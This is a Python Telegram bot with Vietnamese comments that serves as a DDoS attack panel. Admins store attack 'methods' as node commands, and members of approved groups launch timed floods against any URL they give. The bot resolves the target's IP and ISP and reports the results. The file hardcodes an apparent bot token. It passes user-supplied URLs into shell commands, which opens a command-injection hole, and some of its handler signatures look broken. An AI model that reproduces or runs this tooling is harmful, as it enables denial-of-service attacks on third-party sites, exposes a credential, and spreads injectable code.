import time, json, asyncio, socket, requests
from urllib import parse
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from html import escape

TOKEN = '7770728691:AAFnFvQKVdLfdKiAu3o1gFN4hleR1CJmucg'

# Thêm 10 UID admin và 10 Group ID
ADMIN_IDS = [7371969470, 123456789, 987654321, 192837465, 123123123, 456456456, 789789789, 135135135, 246246246, 357357357]  
GROUP_IDS = [-1002434530321, -1001111111111, -1002222222222, -1003333333333, -1004444444444, -1005555555555, -1006666666666, -1007777777777, -1008888888888, -1009999999999]

user_processes = {}

def load_methods(): 
    try: return json.load(open('methods.json', 'r'))
    except: return {}

def save_methods(data): 
    with open('methods.json', 'w') as f: json.dump(data, f, indent=4)

def get_ip_and_isp(url): 
    try: 
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.ok else None
    except: return None, None

async def command_handler(update, context, handler_func, min_args, help_text):
    if len(context.args) < min_args: return await update.message.reply_text(help_text)
    return await handler_func(update, context)

async def add_method(update, context, methods_data):
    if update.message.from_user.id not in ADMIN_IDS:
        return await update.message.reply_text("You do not have permission to use this command.")
    if len(context.args) < 2:
        return await update.message.reply_text("Invalid syntax. Use the command as follows: \n/add <method_name> <url> timeset <time> <additional_args>")
    method_name, url = context.args[0], context.args[1]
    attack_time = 60  # Default time if no timeset
    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await update.message.reply_text("Invalid time parameter.")
        context.args = context.args[:context.args.index('timeset')] + context.args[context.args.index('timeset') + 2:]
    command = f"node --max-old-space-size=102400 {method_name} {url} {attack_time} " + " ".join(context.args[2:])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time}
    save_methods(methods_data)
    await update.message.reply_text(f"Method {method_name} has been added.")

# Lệnh /methods để liệt kê các phương thức
async def methods(update, methods_data):
    if not methods_data: 
        return await update.message.reply_text("No methods available.")
    methods_list = "Available methods:\n" + "\n".join([f"{name}: {data['time']} seconds" for name, data in methods_data.items()])
    await update.message.reply_text(methods_list)

# Lệnh /tên_methods url để bắt đầu tấn công
async def attack_method(update, context, methods_data):
    if update.message.chat.id not in GROUP_IDS:
        return await update.message.reply_text("This command can only be used in approved groups.")
    if update.message.from_user.id in user_processes and user_processes[update.message.from_user.id].returncode is None:
        return await update.message.reply_text("You already have an ongoing attack. Please wait for it to finish before starting another.")
    
    if len(context.args) < 1: 
        return await update.message.reply_text("Invalid syntax. Use the command as follows: \n/tên_methods <url>")
    
    method_name = context.args[0]
    url = context.args[1] if len(context.args) > 1 else None
    if not url:
        return await update.message.reply_text("URL is required for the attack.")
    
    if method_name not in methods_data:
        return await update.message.reply_text("Method does not exist.")
    
    attack_time = methods_data[method_name].get('time', None)
    if update.message.from_user.id in ADMIN_IDS and len(context.args) > 2:
        try: 
            attack_time = int(context.args[2])
        except ValueError: 
            return await update.message.reply_text("Invalid time parameter. Please enter a valid number.")
    
    if update.message.from_user.id not in ADMIN_IDS and len(context.args) > 2:
        return await update.message.reply_text("You are not an admin. You cannot specify the time for the attack.")
    
    if not attack_time:
        return await update.message.reply_text(f"Attack time for method {method_name} is not set in methods.json.")
    
    ip, isp_info = get_ip_and_isp(url)
    if not ip: 
        return await update.message.reply_text("Could not retrieve IP from URL.")
    
    command = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url).replace(str(methods_data[method_name]['time']), str(attack_time))
    
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'No ISP information available.'
    
    username = update.message.from_user.username or update.message.from_user.full_name
    start_time = time.time()  # Start time of the attack
    check_status_button = InlineKeyboardButton("🔍 Check website status", url=f"https://check-host.net/check-http?host={url}")
    keyboard = InlineKeyboardMarkup([[check_status_button]])
    
    await update.message.reply_text(
        f"Attack {method_name} started by @{username}.\nISP information of host {escape(url)}:\n<pre>{escape(isp_info_text)}</pre>\n"
        f"Attack will run for {attack_time} seconds.\n"
        f"Attack started at: {datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='HTML', reply_markup=keyboard
    )
    
    asyncio.create_task(execute_attack(command, update, method_name, keyboard, url, start_time, attack_time))

async def execute_attack(command, update, method_name, keyboard, url, start_time, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[update.message.from_user.id] = process
        stdout, stderr = await process.communicate()
        end_time = time.time()
        attack_status = "success" if not stderr else "failed"
        error_message = stderr.decode() if stderr else None
    except Exception as e:
        end_time = time.time()
        attack_status = "failed"
        error_message = str(e)
    
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name,
        "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'),
        "end_time": datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M:%S'),
        "elapsed_time": elapsed_time,
        "attack_status": attack_status,
        "error": error_message or "None"
    }
    
    attack_info_text = json.dumps(attack_info, indent=2, ensure_ascii=False)
    safe_attack_info_text = escape(attack_info_text)
    
    await update.message.reply_text(
        f"Attack completed! Total time: {elapsed_time} seconds.\n\nDetails:\n<pre>{safe_attack_info_text}</pre>",
        parse_mode='HTML', reply_markup=keyboard
    )
    del user_processes[update.message.from_user.id]

async def delete_method(update, context, methods_data):
    if update.message.from_user.id not in ADMIN_IDS:
        return await update.message.reply_text("You do not have permission to use this command.")
    if len(context.args) < 1:
        return await update.message.reply_text("Invalid syntax. Use the command as follows: \n/del <method_name>")
    method_name = context.args[0]
    if method_name in methods_data:
        del methods_data[method_name]
        save_methods(methods_data)
        await update.message.reply_text(f"Method {method_name} has been deleted.")
    else:
        await update.message.reply_text(f"Method {method_name} does not exist.")

async def help_command(update):
    help_text = """
    Available commands:
    /add <method_name> <url> timeset <time> - Add a new attack method.
    /tên_methods <url> - Start an attack using a method.
    /methods - List all available methods.
    /del <method_name> - Delete an attack method.
    """
    await update.message.reply_text(help_text)

def main():
    methods_data = load_methods()

    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('add', lambda update, context: command_handler(update, context, add_method, 2, "Invalid syntax for /add command.")))
    application.add_handler(CommandHandler('tên_methods', lambda update, context: command_handler(update, context, attack_method, 2, "Invalid syntax for /tên_methods command.")))
    application.add_handler(CommandHandler('methods', methods, pass_args=True))
    application.add_handler(CommandHandler('del', lambda update, context: command_handler(update, context, delete_method, 1, "Invalid syntax for /del command.")))

    application.run_polling()

if __name__ == '__main__':
    main()
